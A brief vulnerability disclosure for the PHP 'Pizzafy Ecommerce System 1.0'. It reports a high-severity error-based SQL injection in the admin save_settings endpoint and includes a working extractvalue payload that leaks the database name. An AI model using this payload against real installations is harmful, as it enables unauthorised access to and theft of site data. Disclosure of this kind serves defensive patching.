# Pizzafy Ecommerce System 1.0

**Vulnerability Type:** SQL Injection (Error Based) - SAVE SETTINGS  
**Severity:** HIGH  

**Link to Download:** https://www.sourcecodester.com/php/18708/pizzafy-ecommerce-system.html

## Vulnerable Endpoint
`pizzafy/admin/ajax.php?action=save_settings`

## SQL Injection Query
```sql
name=Test', name = extractvalue(1, concat(0x7e, database())) -- 
